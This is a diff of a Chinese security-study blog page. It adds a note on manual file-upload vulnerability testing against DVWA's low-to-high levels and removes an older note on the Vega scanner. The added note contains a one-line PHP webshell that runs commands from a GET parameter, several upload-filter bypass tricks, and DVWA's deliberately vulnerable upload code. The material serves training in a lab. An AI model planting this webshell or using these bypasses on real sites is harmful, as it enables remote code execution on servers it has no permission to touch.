@@ -240,6 +240,229 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" itemprop="url">Kali Linux笔记(四十七)：手动漏洞挖掘--文件上传</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
+                2020-01-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  753 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-手动漏洞挖掘"><a href="#1-手动漏洞挖掘" class="headerlink" title="1. 手动漏洞挖掘"></a>1. 手动漏洞挖掘</h4><ul>
+<li><?php echo shell_exec($_GET['cmd']);?></li>
+<li>直接上传webshell</li>
+<li>修改文件类型上传webshell<ul>
+<li>Mimetype–文件头、扩展名（判断文件名mimetype 1.jpg）</li>
+<li>一般判断文件类型判断两个方向：1.文件头前10个字节 2.扩展名</li>
+</ul>
+</li>
+<li>修改扩展名上传webshell<ul>
+<li>静态解析文件扩展名时可能无法执行</li>
+</ul>
+</li>
+<li>文件头绕过过滤上传webshell</li>
+<li>上传目录权限（上传权限限制，限制上传文件执行）</li>
+<li>DVWA的Upload（low）：<ul>
+<li>1.正常上传一张图片（.jpg,.png等图片文件，图片不能太大）</li>
+<li>2.<strong><code>🔺命令：vi 1.php</code></strong>（<?php echo shell_exec($_GET['cmd']);?>）</li>
+<li>3.可以正常上传，传入参数：?cmd=id（url中访问1.php）</li>
+<li>▲ 绕过方法：1.上传php 2.修改请求头MAX_SIZE的大小进行重放</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">        $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">        $target_path = $target_path.basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">        if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;].$target_path))&#123;</span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo $target_path.&apos;successfully uploaded!&apos;;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DVWA的Upload（medium）：<ul>
+<li>正常上传一张1.png文件，但不能正常上传，需要image/jpeg文件</li>
+<li>▲ 绕过方法：修改请求头的Content-type为image/jpeg进行重放</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">            $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line">            $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</span><br><span class="line">            $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type&apos;];</span><br><span class="line">            $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];</span><br><span class="line"></span><br><span class="line">            if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123;</span><br><span class="line">                </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                    </span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DVWA的Upload（high）：<ul>
+<li>▲ 绕过方法：修改请求头中的filename为1.php.jpg进行重放</li>
+<li>防护方法：更严格防护判断文件传输body中对文件类型的定义（但仍不安全）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">            $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line">            $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</span><br><span class="line">            $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &apos;.&apos;) + 1);</span><br><span class="line">            $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];</span><br><span class="line"></span><br><span class="line">            if (($uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123;</span><br><span class="line">                    </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                </span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            else&#123;</span><br><span class="line">                </span><br><span class="line">                echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DVWA的Upload（more high）：<ul>
+<li>防护判断文件传输body中对文件类型的定义</li>
+<li>▲ 绕过方法：1.找一张jpeg的图片，修改请求头中的filename为1.php.jpg 2.删除body中的jpeg图片中相关像素的信息，替换为webshell 3.进行重放</li>
+<li>防护方法：修改上一次目录的属主等其他用户的执行权限（权限为620–无执行权限）</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2901,243 +3124,6 @@ Test Links In URLs（Bookmark Test）：只测试连接
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%85%AB)%EF%BC%9AVega/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%85%AB)%EF%BC%9AVega/" itemprop="url">Kali Linux笔记(三十八)：Vega</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T10:59:15+08:00">
-                2019-12-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  539 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-vega（纯界面化）"><a href="#1-vega（纯界面化）" class="headerlink" title="1. vega（纯界面化）"></a>1. vega（纯界面化）</h4><ul>
-<li><p>Kali 2.0以上无此软件，需要下载： <a href="https://subgraph.com/vega/download/index.en.html" target="_blank" rel="noopener">https://subgraph.com/vega/download/index.en.html</a></p>
-<blockquote>
-<pre><code>▲ 2019.12.24软件需要java 8 openjdk
-▲ 2019.12.24在Windows安装运行成功
-▲ 2019.12.24在Kali上运行报错</code></pre></blockquote>
-</li>
-<li><p>JAVA编写的开源Web扫描器</p>
-</li>
-<li><p>扫描模式</p>
-</li>
-<li><p>代理模式</p>
-</li>
-<li><p>爬站、处理表单、注入测试</p>
-</li>
-<li><p>支持SSL：<a href="http://vega/ca.crt（在代理模式下进行访问）" target="_blank" rel="noopener">http://vega/ca.crt（在代理模式下进行访问）</a></p>
-</li>
-</ul>
-<blockquote>
-<pre><code>代理模式：
-Web Client → Proxy Server（可截断修改） → Web Server
-
-▲ 代理服务器，一般用于手动漏洞挖掘，可代替客户端进行扫描
-
-爬站：
-主动扫描阶段：刚开始的手动提交少提交有攻击性代码的内容
-代理扫描阶段：通过字典以及代理服务器发送大量请求进行爬站（Fuzz）
-
-vega比较集中关注Web Application方面的漏洞，比较少关注软件，Web Server方面的漏洞，相对比较集中在程序员编写代码方面的漏洞</code></pre></blockquote>
-<h4 id="2-vega基本参数配置"><a href="#2-vega基本参数配置" class="headerlink" title="2. vega基本参数配置"></a>2. vega基本参数配置</h4><ul>
-<li>Window → Preferences → General<ul>
-<li>SOCKS proxy/External HTTP proxy</li>
-<li>General → Appearance（界面显示方式，默认）</li>
-<li>General → Updates（自动更新，默认）</li>
-</ul>
-</li>
-<li>Window → Preferences → Proxy（vega自提供代理）<ul>
-<li>Default User-Agent（默认，可删除vega标识）</li>
-<li>Override client User-Agent（默认）</li>
-<li>Prevent browser caching（访问服务器每次发送新的请求，默认）</li>
-<li>Prevent Intermediate（proxy）caching（阻止代理缓存，默认）</li>
-<li>Listener（vega本机监听网络地址，提供多个代理给局域网）</li>
-</ul>
-</li>
-<li>Window → Preferences → Scanner<ul>
-<li>Debug → Log all scanner requests（记录扫描记录，默认）</li>
-<li>Debug → Display debug output in console（显示详细扫描信息，默认）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>▲ vega最主要的是，vega自带的代理（IP地址:端口）
-▲ 无论是Proxy还是Scanner，都需要设置Target，Target Scope：Base Paths/Exclude（URL or pattern）
-▲ autoproxt设置vega代理模式：IP：端口</code></pre></blockquote>
-<h4 id="3-vega使用"><a href="#3-vega使用" class="headerlink" title="3. vega使用"></a>3. vega使用</h4><ul>
-<li>Proxy（Target Scope）</li>
-<li>Scanner（Target Scope+Cookie）</li>
-<li>Intercept（vega支持很不友好，可能存在bug）</li>
-</ul>
-<blockquote>
-<pre><code>vega是自签名证书，可能会存在别方的地址劫持（别的地方的自签名证书），可以在官方上下载Vega的自签名证书，然后安装到浏览器上
-火狐查看证书信息：右键 → View Page Info → Security → View Certificate
-
-▲ 证书颁发是给域名的，不是给IP地址的</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3192,7 +3178,7 @@ vega比较集中关注Web Application方面的漏洞，比较少关注软件，W
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">101</span>
+                  <span class="site-state-item-count">102</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3299,7 +3285,7 @@ vega比较集中关注Web Application方面的漏洞，比较少关注软件，W
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">98.3k</span>
+    <span title="Site words total count">98.6k</span>
   
 </div>
 
